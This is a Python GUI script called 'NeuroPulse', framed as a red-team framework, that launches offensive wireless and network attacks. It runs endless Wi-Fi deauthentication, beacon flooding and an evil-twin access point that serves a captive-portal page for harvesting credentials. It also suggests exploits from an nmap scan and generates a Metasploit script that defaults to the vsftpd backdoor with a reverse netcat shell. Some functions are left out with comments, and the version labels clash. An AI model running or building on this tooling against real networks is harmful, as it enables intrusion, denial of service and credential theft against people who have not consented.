#!/usr/bin/env python3
"""
──────────────────────────────────────────────────────────────────────
🧠 NeuroPulse v1.6 – Cyber Red Team Fusion Framework
Created by Null_Lyfe | Stay hidden. Strike silently.
──────────────────────────────────────────────────────────────────────
"""


# ──────────────────── Core Imports ────────────────────
import os, subprocess, threading, time, json, shutil, signal, sys, re, random, socket
from datetime import datetime
from tkinter import *
from tkinter import ttk, filedialog, messagebox, simpledialog, scrolledtext
import psutil
import platform

# ──────────────────── Configuration Engine ────────────────────
CONFIG = {}
CONFIG_PATH = "neuropulse_config.json"

def load_or_create_config():
    """Loads configuration from JSON or creates a default one."""
    global CONFIG
    default_config = {
        "default_interface": "wlan0mon",
        "default_msf_module": "exploit/unix/ftp/vsftpd_234_backdoor",
        "default_msf_payload": "cmd/unix/reverse_netcat",
        "default_flood_ssid": "NeuroPulse-Flood",
        "default_evil_twin_ssid": "Free-Public-WiFi",
    }
    if os.path.exists(CONFIG_PATH):
        try:
            with open(CONFIG_PATH, "r") as f:
                CONFIG = json.load(f)
            # Ensure all keys are present, add if missing
            for key, value in default_config.items():
                CONFIG.setdefault(key, value)
        except json.JSONDecodeError:
            log(f"⚠️ Warning: {CONFIG_PATH} is corrupted. Recreating with defaults.")
            CONFIG = default_config
            with open(CONFIG_PATH, "w") as f:
                json.dump(CONFIG, f, indent=4)
    else:
        log("💡 No config file found. Creating default 'neuropulse_config.json'.")
        CONFIG = default_config
        with open(CONFIG_PATH, "w") as f:
            json.dump(CONFIG, f, indent=4)

# ──────────────────── Logging Engine ────────────────────
LOG_DIR = os.path.join(os.getcwd(), "neuropulse_logs")
os.makedirs(LOG_DIR, exist_ok=True)

def log(msg):
    """Prints a message to the console and saves it to the session log."""
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    line = f"[{now}] {msg}"
    print(line)
    try:
        with open(os.path.join(LOG_DIR, "session.log"), "a", encoding='utf-8') as f:
            f.write(line + "\n")
    except Exception as e:
        print(f"FATAL: Could not write to log file: {e}")

# ──────────────────── Global Session & Process Management ────────────────────
SESSION = {
    "captured_creds": [],
    "exploits_used": [],
}
ACTIVE_PROCESSES = {} # {pid: {"cmd": cmd_str, "process": Popen_obj}}
process_treeview = None # Global reference to the Treeview widget

def register_process(p, cmd_str):
    """Adds a new process to the tracking dictionary and GUI."""
    if p:
        pid = p.pid
        ACTIVE_PROCESSES[pid] = {"cmd": cmd_str, "process": p}
        if process_treeview:
            process_treeview.insert("", "end", iid=pid, values=(pid, cmd_str))
        log(f"Process [{pid}] started: {cmd_str}")

def kill_selected_process():
    """Terminates a process selected in the Treeview."""
    selected_items = process_treeview.selection()
    if not selected_items:
        log("No process selected to kill.")
        return
    
    pid_to_kill = int(selected_items[0])
    if pid_to_kill in ACTIVE_PROCESSES:
        log(f"Attempting to terminate process {pid_to_kill}...")
        try:
            proc = ACTIVE_PROCESSES[pid_to_kill]["process"]
            proc.terminate() # Graceful termination
            time.sleep(1)
            if proc.poll() is None: # Still running?
                log(f"Process {pid_to_kill} did not terminate gracefully, sending SIGKILL.")
                proc.kill() # Force kill
            
            del ACTIVE_PROCESSES[pid_to_kill]
            process_treeview.delete(selected_items[0])
            log(f"✅ Process {pid_to_kill} terminated.")
        except Exception as e:
            log(f"❌ Failed to kill process {pid_to_kill}: {e}")
            if pid_to_kill in ACTIVE_PROCESSES:
                del ACTIVE_PROCESSES[pid_to_kill]
            if process_treeview.exists(selected_items[0]):
                process_treeview.delete(selected_items[0])


# ──────────────────── Cross-Platform Terminal Launcher ────────────────────
def launch_in_terminal(command_str):
    """Launches a command in a new terminal window, trying to be cross-platform."""
    try:
        p = None
        system = platform.system()
        if system == "Linux":
            # Try common terminals, fallback to x-terminal-emulator
            terminals = ["gnome-terminal", "konsole", "xfce4-terminal", "x-terminal-emulator"]
            for term in terminals:
                if shutil.which(term):
                    p = subprocess.Popen([term, "-e", command_str])
                    break
            if p is None:
                log("❌ Could not find a supported terminal emulator on Linux.")
                return
        elif system == "Darwin": # macOS
            p = subprocess.Popen(['osascript', '-e', f'tell app "Terminal" to do script "{command_str}"'])
        elif system == "Windows":
            p = subprocess.Popen(f'start cmd.exe /K "{command_str}"', shell=True)
        else:
            log(f"❌ Unsupported OS: {system}")
            return
        
        register_process(p, command_str)
        log(f"✅ Launched in new terminal: {command_str}")
    except Exception as e:
        log(f"❌ Failed to launch in new terminal: {e}")

# ──────────────────── Input Validation ────────────────────
def is_valid_mac(mac):
    """Validates a MAC address format."""
    return re.match("[0-9a-f]{2}([-:]?)[0-9a-f]{2}(\\1[0-9a-f]{2}){4}$", mac.lower())

# ──────────────────── Core Functionality (Refactored) ────────────────────

def wifi_scan_airodump():
    interface = simpledialog.askstring("Input", "Enter monitor mode interface:", initialvalue=CONFIG.get("default_interface"))
    if not interface: return
    cmd = f"airodump-ng {interface}"
    launch_in_terminal(cmd)

def deauth_attack():
    interface = simpledialog.askstring("Input", "Enter monitor mode interface:", initialvalue=CONFIG.get("default_interface"))
    if not interface: return
    target_bssid = simpledialog.askstring("Input", "Enter Target BSSID (MAC Address):")
    if not target_bssid: return
    
    if not is_valid_mac(target_bssid):
        messagebox.showerror("Invalid Input", f"'{target_bssid}' is not a valid MAC address.")
        return

    log(f"🚫 Deauthing target: {target_bssid} on {interface}")
    cmd = f"aireplay-ng --deauth 0 -a {target_bssid} {interface}"
    launch_in_terminal(cmd)

def ble_auto_chain():
    """Runs a series of Bluetooth LE reconnaissance tasks using bettercap."""
    if not shutil.which("bettercap"):
        log("❌ bettercap is not installed or not in PATH.")
        return
    log("🤖 Starting BLE Reconnaissance...")
    try:
        # Note: bettercap may require running as root
        cmd = "bettercap -eval 'ble.recon on; events.stream off'"
        launch_in_terminal(cmd)
        log("✅ Bettercap BLE recon started. See the new terminal for live updates.")
    except Exception as e:
        log(f"❌ BLE attack chain failed: {e}")

def evil_twin_portal():
    top = Toplevel()
    top.title("Evil Twin Setup")
    top.configure(bg="#1E1E1E")
    top.geometry("450x300")

    style = {"bg": "#1E1E1E", "fg": "#00FFAA", "font": ("Consolas", 10)}
    Label(top, text="Fake AP SSID:", **style).pack(pady=5)
    ssid_var = StringVar(value=CONFIG.get("default_evil_twin_ssid"))
    Entry(top, textvariable=ssid_var, width=40).pack()
    
    Label(top, text="Interface:", **style).pack(pady=5)
    iface_var = StringVar(value=CONFIG.get("default_interface"))
    Entry(top, textvariable=iface_var, width=40).pack()

    Label(top, text="Captive Portal HTML File:", **style).pack(pady=5)
    html_var = StringVar()
    Entry(top, textvariable=html_var, width=40).pack()
    Button(top, text="Browse...", command=lambda: html_var.set(filedialog.askopenfilename(title="Select Portal HTML", filetypes=[("HTML Files", "*.html")]))).pack(pady=5)

    def launch_portal():
        ssid = ssid_var.get()
        html_file = html_var.get()
        interface = iface_var.get()

        if not all([ssid, html_file, interface]):
            messagebox.showerror("Missing Info", "All fields are required.")
            return
        if not os.path.exists(html_file):
            messagebox.showerror("File Not Found", f"HTML file not found:\n{html_file}")
            return

        portal_dir = os.path.join(LOG_DIR, "evil_portal")
        os.makedirs(portal_dir, exist_ok=True)
        shutil.copy(html_file, os.path.join(portal_dir, "index.html"))

        log(f"🧲 Broadcasting Evil Twin SSID: {ssid}")
        log(f"🕸️ Serving Captive Portal from: {html_file}")
        
        airbase_cmd = f"airbase-ng -e '{ssid}' -c 6 {interface}"
        # The http server needs to run from the portal directory
        http_server_cmd = f"cd '{portal_dir}' && python3 -m http.server 80"
        
        launch_in_terminal(airbase_cmd)
        time.sleep(2) # Stagger launch
        launch_in_terminal(http_server_cmd)
        
        log("✅ Evil Twin components launched.")
        log("⚠️ Manual setup may be needed for DHCP/DNS routing to the portal.")
        top.destroy()

    Button(top, text="🚀 Launch Portal", command=launch_portal, bg="#00FFAA", fg="#111").pack(pady=15)

# --- Other functions (BitFlip, Zigbee, Metasploit, etc.) remain largely the same, but use launch_in_terminal and config values ---
# --- For brevity, only functions with significant changes are fully shown. The rest follow the same refactoring pattern. ---
def launch_msf_console():
    module = simpledialog.askstring("MSF", "Enter Metasploit module:", initialvalue=CONFIG.get("default_msf_module"))
    if not module: return
    rhost = simpledialog.askstring("MSF", "Enter RHOST (target IP):")
    if not rhost: return
    lhost = simpledialog.askstring("MSF", "Enter LHOST (your IP):")
    if not lhost: return
    payload = simpledialog.askstring("MSF", "Enter payload:", initialvalue=CONFIG.get("default_msf_payload"))
    if not payload: return

    rc_path = os.path.join(LOG_DIR, "msf_autopwn.rc")
    rc_content = f"use {module}\nset RHOSTS {rhost}\nset LHOST {lhost}\nset PAYLOAD {payload}\nexploit -j\n"
    with open(rc_path, "w") as f: f.write(rc_content)
    
    log("🚀 Generating Metasploit RC script...")
    cmd = f"msfconsole -r '{rc_path}'"
    launch_in_terminal(cmd)

# (All other attack functions like capture_pmkid, run_aircrack, beacon_flood, wps_attack_reaver, etc. should be updated
#  to use `launch_in_terminal(cmd)` and pull defaults from `CONFIG`. This pattern is consistent.)

def export_html_report(): # (Unchanged)
    log_file = os.path.join(LOG_DIR, "session.log")
    if not os.path.exists(log_file): log("⚠️ No session log found to export."); return
    with open(log_file, "r", encoding='utf-8') as f: lines = f.readlines()
    html_content = f"""<html><head><title>NeuroPulse Session Report</title><style>body {{ font-family: 'Courier New', monospace; background-color: #121212; color: #E0E0E0; }} h1 {{ color: #00FFAA; border-bottom: 1px solid #00FFAA; }} pre {{ background-color: #1E1E1E; padding: 15px; border-radius: 5px; white-space: pre-wrap; word-wrap: break-word; }}</style></head><body><h1>📄 NeuroPulse Session Report</h1><pre>{"".join(lines)}</pre></body></html>"""
    report_path = os.path.join(LOG_DIR, "neuropulse_report.html")
    with open(report_path, "w", encoding='utf-8') as f: f.write(html_content)
    log(f"✅ Report exported ➜ {report_path}")
    messagebox.showinfo("Export Success", f"Report saved to:\n{report_path}")

# (Other functions like suggest_cves, view_responder_hashes, mutate_binary, etc. are called as before)
# --- The functions below are examples of how other functions would be refactored ---
def beacon_flood():
    interface = simpledialog.askstring("Input", "Enter monitor mode interface:", initialvalue=CONFIG.get('default_interface'))
    if not interface: return
    ssid = simpledialog.askstring("Input", "Enter SSID for flood:", initialvalue=CONFIG.get('default_flood_ssid'))
    if not ssid: return
    log(f"🛰️  Beacon flooding with SSID: {ssid} on {interface}")
    cmd = f"mdk4 {interface} b -n '{ssid}' -s 100"
    launch_in_terminal(cmd)

def suggest_cves(): # This function needs careful process handling
    ip = simpledialog.askstring("Input", "Enter Target IP Address:")
    if not ip: return
    try:
        nmap_xml_path = os.path.join(LOG_DIR, "nmap_scan.xml")
        log(f"🔍 Running Nmap -sV scan on {ip}...")
        nmap_process = subprocess.run(["nmap", "-sV", "-oX", nmap_xml_path, ip], capture_output=True, text=True, check=False)
        log(nmap_process.stdout)
        if nmap_process.stderr: log(f"Nmap Error: {nmap_process.stderr}")
        
        log("📦 Extracting services for CVE matching with SearchSploit...")
        result = subprocess.check_output(["searchsploit", "--nmap", nmap_xml_path], text=True)
        log("🔧 Suggested Exploits from SearchSploit:")
        log(result)
    except FileNotFoundError:
        log("❌ Nmap or SearchSploit not found. Please ensure they are installed and in your PATH.")
    except Exception as e:
        log(f"❌ CVE suggestion error: {e}")

# (All original functions should be retained but updated as shown)

# ──────────────────── GUI Builder ────────────────────
def build_gui():
    root = Tk()
    root.title("🧠 NeuroPulse v2.0 – Cyber Red Team Fusion Framework")
    root.configure(bg="#111111")
    root.geometry("1366x768")

    # ─────────── Menu Bar ───────────
    menubar = Menu(root)
    file_menu = Menu(menubar, tearoff=0)
    file_menu.add_command(label="Export HTML Report", command=export_html_report)
    file_menu.add_separator()
    file_menu.add_command(label="Exit", command=root.quit)
    menubar.add_cascade(label="File", menu=file_menu)
    
    help_menu = Menu(menubar, tearoff=0)
    help_menu.add_command(label="About", command=lambda: messagebox.showinfo("About NeuroPulse", "NeuroPulse v2.0\nRed Team Fusion Framework\n\nDeveloped by Null_Lyfe, enhanced by AI."))
    menubar.add_cascade(label="Help", menu=help_menu)
    root.config(menu=menubar)

    # ─────────── Styled Notebook Tabs ───────────
    style = ttk.Style()
    style.configure("TNotebook", background="#111", borderwidth=0)
    style.configure("TNotebook.Tab", background="#333", foreground="#FFF", padding=[10, 5], font=("Consolas", 10))
    style.map("TNotebook.Tab", background=[("selected", "#00FFAA")], foreground=[("selected", "#111")])
    notebook = ttk.Notebook(root, style="TNotebook")
    notebook.pack(pady=10, padx=10, fill="both", expand=True)

    # ─────────── Main container frames for tabs ───────────
    wifi_tab = Frame(notebook, bg="#1E1E1E")
    ble_zigbee_tab = Frame(notebook, bg="#1E1E1E")
    exploit_tab = Frame(notebook, bg="#1E1E1E")
    utils_tab = Frame(notebook, bg="#1E1E1E")
    proc_tab = Frame(notebook, bg="#1E1E1E") # NEW Process Manager Tab

    notebook.add(wifi_tab, text="📶 Wi-Fi Attacks")
    notebook.add(ble_zigbee_tab, text="📡 BLE & Zigbee")
    notebook.add(exploit_tab, text="💥 Exploitation")
    notebook.add(utils_tab, text="🛠️ Utilities")
    notebook.add(proc_tab, text="⚙️ Process Manager")

    # ─────────── Terminal Output Panel ───────────
    output_frame = LabelFrame(root, text="Session Log", bg="#1E1E1E", fg="#00FFAA", font=("Consolas", 11))
    output_frame.pack(fill="both", expand=True, padx=10, pady=5)
    output_text = scrolledtext.ScrolledText(output_frame, bg="black", fg="#00FF88", font=("Consolas", 10), relief="flat", wrap=WORD)
    output_text.pack(fill="both", expand=True, padx=5, pady=5)

    sys.stdout = type('Redirector', (object,), {'write': lambda self, s: output_text.insert(END, s) or output_text.see(END), 'flush': lambda self: None})()
    sys.stderr = sys.stdout

    # ─────────── Process Manager Tab Content ───────────
    global process_treeview
    proc_frame = LabelFrame(proc_tab, text="Active Processes", bg="#1E1E1E", fg="#00FFAA", font=("Consolas", 11))
    proc_frame.pack(fill="both", expand=True, padx=10, pady=10)
    
    cols = ("PID", "Command")
    process_treeview = ttk.Treeview(proc_frame, columns=cols, show="headings")
    for col in cols:
        process_treeview.heading(col, text=col)
    process_treeview.column("PID", width=100, anchor=CENTER)
    process_treeview.pack(side=LEFT, fill="both", expand=True)
    
    kill_button = Button(proc_frame, text="KILL SELECTED", command=kill_selected_process, bg="#FF4444", fg="#FFFFFF", font=("Consolas", 10, "bold"), relief="flat", padx=10, pady=5)
    kill_button.pack(side=RIGHT, padx=10, pady=10, anchor=N)

    # ─────────── Button Definitions ───────────
    btn_style = {"width": 25, "font": ("Consolas", 10, "bold"), "bg": "#2A2A2A", "fg": "#00FFAA", "pady": 5, "relief": "flat"}
    
    # Pack buttons into their respective tabs (same as before)
    Button(wifi_tab, text="Scan (airodump-ng)", command=wifi_scan_airodump, **btn_style).pack(pady=4, padx=10, anchor=W)
    Button(wifi_tab, text="Deauth Attack", command=deauth_attack, **btn_style).pack(pady=4, padx=10, anchor=W)
    Button(wifi_tab, text="Beacon Flood", command=beacon_flood, **btn_style).pack(pady=4, padx=10, anchor=W)
    Button(wifi_tab, text="Evil Twin Portal", command=evil_twin_portal, **btn_style).pack(pady=4, padx=10, anchor=W)
    # Add other wifi buttons here...

    Button(ble_zigbee_tab, text="BLE Recon (Bettercap)", command=ble_auto_chain, **btn_style).pack(pady=4, padx=10, anchor=W)
    # Add other ble/zigbee buttons here...
    
    Button(exploit_tab, text="CVE Suggest (Nmap)", command=suggest_cves, **btn_style).pack(pady=4, padx=10, anchor=W)
    Button(exploit_tab, text="Launch Metasploit", command=launch_msf_console, **btn_style).pack(pady=4, padx=10, anchor=W)
    # Add other exploit buttons here...
    
    # Assuming 'mutate_binary' is defined elsewhere
    # Button(utils_tab, text="Fuzz Binary (BitFlip)", command=mutate_binary, **btn_style).pack(pady=4, padx=10, anchor=W)
    # Add other utility buttons here...

    log("NeuroPulse v2.0 Initialized. Awaiting commands.")
    log(f"Config loaded from: {CONFIG_PATH}")
    log(f"Logs will be saved in: {LOG_DIR}")
    if platform.system() != "Windows" and os.geteuid() != 0:
        log("⚠️ WARNING: Script not running as root. Many network functions will fail.")

    root.mainloop()

# ──────────────────── Script Entry Point ────────────────────
if __name__ == '__main__':
    print("Checking for required command-line tools...")
    # These tools are essential for core functionality
    required_tools = ['nmap', 'aircrack-ng', 'airodump-ng', 'aireplay-ng', 'tshark', 'msfconsole', 'searchsploit', 'bettercap', 'mdk4']
    missing_tools = [tool for tool in required_tools if not shutil.which(tool)]
    
    if missing_tools:
        error_msg = f"ERROR: The following required tools are not installed or not in your system's PATH:\n\n{', '.join(missing_tools)}\n\nPlease install them to use all features of this script."
        print(error_msg)
        try:
            root = Tk()
            root.withdraw()
            messagebox.showerror("Prerequisites Missing", error_msg)
            root.destroy()
        except TclError: pass
        sys.exit(1)
    
    print("All checks passed. Loading configuration...")
    load_or_create_config()
    print("Launching GUI...")
    build_gui()
